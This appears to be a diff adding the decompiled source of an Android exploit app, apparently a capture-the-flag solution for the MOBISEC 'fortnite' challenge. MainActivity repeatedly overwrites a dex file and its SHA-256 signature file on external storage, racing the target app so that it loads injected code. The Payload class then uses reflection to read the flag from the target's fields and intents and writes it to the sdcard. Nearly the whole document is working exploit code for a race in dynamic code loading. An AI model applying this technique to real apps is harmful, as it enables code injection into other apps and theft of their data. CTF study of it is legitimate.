@@ -1,0 +1,362 @@
+AndroidManifest.xml
+<?xml version="1.0" encoding="utf-8"?>
+<manifest xmlns:android="http://schemas.android.com/apk/res/android"
+    android:versionCode="1"
+    android:versionName="1.0"
+    android:compileSdkVersion="34"
+    android:compileSdkVersionCodename="14"
+    package="com.mobisec.fortniteexploit"
+    platformBuildVersionCode="34"
+    platformBuildVersionName="14">
+    <uses-sdk
+        android:minSdkVersion="22"
+        android:targetSdkVersion="34"/>
+    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
+    <uses-permission android:name="android.permission.INTERNET"/>
+    <permission
+        android:name="com.mobisec.fortniteexploit.DYNAMIC_RECEIVER_NOT_EXPORTED_PERMISSION"
+        android:protectionLevel="signature"/>
+    <uses-permission android:name="com.mobisec.fortniteexploit.DYNAMIC_RECEIVER_NOT_EXPORTED_PERMISSION"/>
+    <application
+        android:theme="@style/Theme.AppCompat.Light.DarkActionBar"
+        android:label="FortniteExploit"
+        android:debuggable="true"
+        android:allowBackup="true"
+        android:supportsRtl="true"
+        android:extractNativeLibs="true"
+        android:appComponentFactory="androidx.core.app.CoreComponentFactory">
+        <activity
+            android:name="com.mobisec.fortniteexploit.FlagActivity"
+            android:exported="true"
+            android:launchMode="singleTask"/>
+        <activity
+            android:name="com.mobisec.fortniteexploit.MainActivity"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN"/>
+                <category android:name="android.intent.category.LAUNCHER"/>
+            </intent-filter>
+        </activity>
+        <provider
+            android:name="androidx.startup.InitializationProvider"
+            android:exported="false"
+            android:authorities="com.mobisec.fortniteexploit.androidx-startup">
+            <meta-data
+                android:name="androidx.emoji2.text.EmojiCompatInitializer"
+                android:value="androidx.startup"/>
+            <meta-data
+                android:name="androidx.lifecycle.ProcessLifecycleInitializer"
+                android:value="androidx.startup"/>
+        </provider>
+    </application>
+</manifest>
+
+com.mobisec.fortnitepayload.Payload
+package com.mobisec.fortnitepayload;
+
+import android.app.Activity;
+import android.content.Context;
+import android.content.Intent;
+import android.os.Environment;
+import android.util.Log;
+import java.io.File;
+import java.io.FileOutputStream;
+import java.io.IOException;
+import java.lang.reflect.Field;
+import java.lang.reflect.Method;
+import java.util.Map;
+
+/* loaded from: assets/fortnite.dex */
+public class Payload {
+    private static final String TAG = "MOBISEC";
+
+    public static void run() {
+        try {
+            Context ctx = currentApplication();
+            if (ctx == null) {
+                Log.e(TAG, "Payload: no Context available");
+                return;
+            }
+            String flag = stealFlag(ctx);
+            Log.e(TAG, "Payload got flag=" + flag);
+            writeToSdcard(flag);
+            Intent i = new Intent();
+            i.setClassName("com.mobisec.fortniteexploit", "com.mobisec.fortniteexploit.FlagActivity");
+            i.addFlags(268435456);
+            i.putExtra("flag", flag);
+            ctx.startActivity(i);
+        } catch (Throwable t) {
+            Log.e(TAG, "Payload exception: " + Log.getStackTraceString(t));
+        }
+    }
+
+    private static Context currentApplication() throws Exception {
+        Class<?> at = Class.forName("android.app.ActivityThread");
+        Method m = at.getDeclaredMethod("currentApplication", new Class[0]);
+        Object app = m.invoke(null, new Object[0]);
+        return (Context) app;
+    }
+
+    private static String stealFlag(Context ctx) throws Exception {
+        Activity a = getResumedActivity();
+        if (a != null) {
+            try {
+                String f = a.getIntent() != null ? a.getIntent().getStringExtra("flag") : null;
+                if (looksLikeFlag(f)) {
+                    return f;
+                }
+            } catch (Throwable th) {
+            }
+        }
+        ClassLoader appCl = ctx.getClassLoader();
+        Class<?> c = Class.forName("com.mobisec.fortnite.MainActivity", false, appCl);
+        try {
+            Field f2 = c.getDeclaredField("flag");
+            f2.setAccessible(true);
+            Object v = f2.get(null);
+            String s = String.valueOf(v);
+            if (looksLikeFlag(s)) {
+                return s;
+            }
+        } catch (NoSuchFieldException e) {
+        }
+        if (a != null && c.isInstance(a)) {
+            for (Field f3 : c.getDeclaredFields()) {
+                if (f3.getType() == String.class) {
+                    f3.setAccessible(true);
+                    Object v2 = f3.get(a);
+                    String s2 = String.valueOf(v2);
+                    if (looksLikeFlag(s2)) {
+                        return s2;
+                    }
+                }
+            }
+        }
+        for (Field f4 : c.getDeclaredFields()) {
+            if (f4.getType() == String.class) {
+                f4.setAccessible(true);
+                try {
+                    Object v3 = f4.get(null);
+                    String s3 = String.valueOf(v3);
+                    if (looksLikeFlag(s3)) {
+                        return s3;
+                    }
+                } catch (Throwable th2) {
+                }
+            }
+        }
+        return "MOBISEC{FLAG_NOT_FOUND}";
+    }
+
+    private static boolean looksLikeFlag(String s) {
+        return s != null && s.contains("MOBISEC{") && s.contains("}");
+    }
+
+    private static Activity getResumedActivity() {
+        Object actsObj;
+        try {
+            Class<?> at = Class.forName("android.app.ActivityThread");
+            Method cur = at.getDeclaredMethod("currentActivityThread", new Class[0]);
+            cur.setAccessible(true);
+            Object thread = cur.invoke(null, new Object[0]);
+            Field fActs = at.getDeclaredField("mActivities");
+            fActs.setAccessible(true);
+            actsObj = fActs.get(thread);
+        } catch (Throwable th) {
+        }
+        if (!(actsObj instanceof Map)) {
+            return null;
+        }
+        Map<Object, Object> acts = (Map) actsObj;
+        for (Object record : acts.values()) {
+            try {
+                Class<?> rClz = record.getClass();
+                Field fPaused = rClz.getDeclaredField("paused");
+                fPaused.setAccessible(true);
+                boolean paused = ((Boolean) fPaused.get(record)).booleanValue();
+                if (!paused) {
+                    Field fAct = rClz.getDeclaredField("activity");
+                    fAct.setAccessible(true);
+                    Object act = fAct.get(record);
+                    if (act instanceof Activity) {
+                        return (Activity) act;
+                    }
+                    continue;
+                }
+            } catch (Throwable th2) {
+            }
+        }
+        return null;
+    }
+
+    private static void writeToSdcard(String flag) throws IOException {
+        try {
+            File out = new File(Environment.getExternalStorageDirectory(), "fortnite_flag.txt");
+            FileOutputStream fos = new FileOutputStream(out, false);
+            fos.write(flag.getBytes("UTF-8"));
+            fos.close();
+        } catch (Exception e) {
+        }
+    }
+}
+
+com.mobisec.fortniteexploit.FlagActivity
+package com.mobisec.fortniteexploit;
+
+import android.os.Bundle;
+import android.util.Log;
+import android.widget.TextView;
+import androidx.appcompat.app.AppCompatActivity;
+
+/* loaded from: classes3.dex */
+public class FlagActivity extends AppCompatActivity {
+    private static final String TAG = "MOBISEC";
+
+    @Override // androidx.fragment.app.FragmentActivity, androidx.activity.ComponentActivity, androidx.core.app.ComponentActivity, android.app.Activity
+    protected void onCreate(Bundle savedInstanceState) {
+        super.onCreate(savedInstanceState);
+        TextView tv = new TextView(this);
+        tv.setTextSize(20.0f);
+        setContentView(tv);
+        String flag = getIntent() != null ? getIntent().getStringExtra("flag") : null;
+        if (flag == null) {
+            tv.setText("No flag extra received :(");
+            Log.e(TAG, "FlagActivity started without flag extra");
+        } else {
+            tv.setText(flag);
+            Log.e(TAG, "FLAG=" + flag);
+        }
+    }
+}
+
+com.mobisec.fortniteexploit.MainActivity
+package com.mobisec.fortniteexploit;
+
+import android.os.Bundle;
+import android.os.Environment;
+import android.os.Handler;
+import android.os.Looper;
+import android.util.Log;
+import android.widget.TextView;
+import androidx.appcompat.app.AppCompatActivity;
+import java.io.File;
+import java.io.FileOutputStream;
+import java.io.IOException;
+import java.io.InputStream;
+import java.security.MessageDigest;
+import kotlin.UByte;
+
+/* loaded from: classes3.dex */
+public class MainActivity extends AppCompatActivity {
+    private static final String ASSET_DEX = "fortnite.dex";
+    private static final String OUT_DEX = "fortnite.dex";
+    private static final String OUT_SIGN = "sign.dat";
+    private static final String TAG = "MOBISEC";
+    private static final String TARGET_ACTIVITY = "com.mobisec.fortnite.MainActivity";
+    private static final String TARGET_PKG = "com.mobisec.fortnite";
+    private TextView flagView;
+    private final Handler h = new Handler(Looper.getMainLooper());
+    private TextView status;
+
+    @Override // androidx.fragment.app.FragmentActivity, androidx.activity.ComponentActivity, androidx.core.app.ComponentActivity, android.app.Activity
+    protected void onCreate(Bundle savedInstanceState) {
+        super.onCreate(savedInstanceState);
+        setContentView(R.layout.activity_main);
+        this.status = (TextView) findViewById(R.id.status);
+        this.flagView = (TextView) findViewById(R.id.flag);
+        String maybeFlag = getIntent() != null ? getIntent().getStringExtra("flag") : null;
+        if (maybeFlag != null) {
+            showFlag(maybeFlag);
+        } else {
+            runExploit();
+        }
+    }
+
+    /* JADX INFO: Access modifiers changed from: private */
+    public void logStatus(String s) {
+        Log.e(TAG, s);
+        this.status.setText(s);
+    }
+
+    private void showFlag(String flag) {
+        Log.e(TAG, "FLAG=" + flag);
+        this.status.setText("Got flag!");
+        this.flagView.setText(flag);
+    }
+
+    private void runExploit() {
+        logStatus("Racing file replacement (without restarting target)...");
+        this.h.postDelayed(new Runnable() { // from class: com.mobisec.fortniteexploit.MainActivity.1
+            int rounds = 0;
+
+            @Override // java.lang.Runnable
+            public void run() {
+                try {
+                    File sd = Environment.getExternalStorageDirectory();
+                    File dexOut = new File(sd, "fortnite.dex");
+                    File signOut = new File(sd, MainActivity.OUT_SIGN);
+                    String sha256Hex = MainActivity.this.writeDexFromAssets(dexOut, "fortnite.dex");
+                    MainActivity.writeString(signOut, sha256Hex);
+                    MainActivity.this.logStatus("Wrote payload to " + dexOut.getAbsolutePath() + " (sha256=" + sha256Hex + ")");
+                } catch (Exception e) {
+                    MainActivity.this.logStatus("Error writing payload: " + e);
+                }
+                int i = this.rounds + 1;
+                this.rounds = i;
+                if (i < 50) {
+                    MainActivity.this.h.postDelayed(this, 500L);
+                } else {
+                    MainActivity.this.logStatus("Done racing. If successful, the target will execute the payload soon.");
+                }
+            }
+        }, 700L);
+    }
+
+    /* JADX INFO: Access modifiers changed from: private */
+    public static void writeString(File out, String s) throws IOException {
+        FileOutputStream fos = new FileOutputStream(out, false);
+        fos.write(s.getBytes("UTF-8"));
+        fos.close();
+    }
+
+    /* JADX INFO: Access modifiers changed from: private */
+    public String writeDexFromAssets(File outFile, String assetName) throws Exception {
+        InputStream in = null;
+        FileOutputStream out = null;
+        MessageDigest md = MessageDigest.getInstance("SHA-256");
+        try {
+            in = getAssets().open(assetName);
+            out = new FileOutputStream(outFile, false);
+            byte[] buf = new byte[4096];
+            while (true) {
+                int r = in.read(buf);
+                if (r == -1) {
+                    break;
+                }
+                md.update(buf, 0, r);
+                out.write(buf, 0, r);
+            }
+            if (in != null) {
+                try {
+                    in.close();
+                } catch (Exception e) {
+                }
+            }
+            try {
+                out.close();
+            } catch (Exception e2) {
+            }
+            return toHex(md.digest());
+        } finally {
+        }
+    }
+
+    private static String toHex(byte[] b) {
+        StringBuilder sb = new StringBuilder(b.length * 2);
+        for (byte x : b) {
+            sb.append(String.format("%02x", Integer.valueOf(x & UByte.MAX_VALUE)));
+        }
+        return sb.toString();
+    }
+}
